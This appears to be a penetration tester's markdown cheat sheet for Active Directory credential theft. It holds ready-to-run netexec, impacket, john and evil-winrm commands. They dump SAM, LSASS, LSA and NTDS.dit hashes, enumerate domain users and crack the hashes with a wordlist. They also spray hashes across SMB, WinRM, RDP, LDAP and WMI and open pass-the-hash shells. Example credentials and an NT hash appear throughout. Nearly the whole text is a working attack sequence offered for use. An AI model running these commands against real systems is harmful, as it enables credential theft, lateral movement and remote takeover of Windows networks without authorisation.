# Dump All Hashes Remotely:

dump SAM - requires local admin
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --sam
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --sam | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt

dump LSASS - requires local admin
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M lsassy
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M nanodump
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M nanodump | fgrep -v '[' | awk -F: '{print $2}' | tee -a dumped_hashes.txt

Dump NTDS.dit - Requires domain admin or local admin on DC
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M ntdsutil | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt
impacket-secretsdump 'user1':'Password1!'@10.10.175.62 -just-dc-ntlm -outputfile test.txt

dump LSA - requires local admin
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --lsa secdump
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --lsa

Get userlist of all users in the domain (do against dc to get all domain users):
netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --rid-brute | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\' -f2 | tee users.txt

Recommended to dump with this too just in case. We wanna make sure we have all hashes:
[mimikatz | Hashdump](..%5Cmimikatz%20_%20Hashdump.md)

Cracking NT hashes (may be needed for RDP access for isntance):
john test.txt.ntds --wordlist=/usr/share/wordlists/rockyou.txt --format=NT

Cracking mscash (just copy entire string and it'll work fine with format):
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=mscash2

Clean up creds:
awk 'NF {print $1}' dumped_hashes.txt | sort | uniq | tee unique_hashes.txt

Bruteforce all hashes against all users(check every cred you have against every relevant protocol available, and --local-auth):
netexec smb 10.10.175.62 -u users.txt -H unique_hashes.txt --continue-on-success
netexec winrm 10.10.175.62 -u users.txt -H unique_hashes.txt --continue-on-success
netexec rdp 10.10.175.62 -u users.txt -H unique_hashes.txt --continue-on-success
netexec ldap 10.10.175.62 -u users.txt -H unique_hashes.txt --continue-on-success
netexec wmi 10.10.175.62 -u users.txt -H unique_hashes.txt --continue-on-success
P.S: Remember to check for local accounts with --local-auth too, and remember to save those users in userlist too, not just domain users

## Get shell:
Over SMB:
impacket-psexec corp.local/Administrator@10.10.175.62 -hashes :bd839bd6be092b794013e25068820d15

Over WINRM:
evil-winrm -u Administrator -H 'bd839bd6be092b794013e25068820d15' -i 10.10.175.62

Over RPC:
impacket-wmiexec corp.local/Administrator@10.10.175.62 -hashes :bd839bd6be092b794013e25068820d15
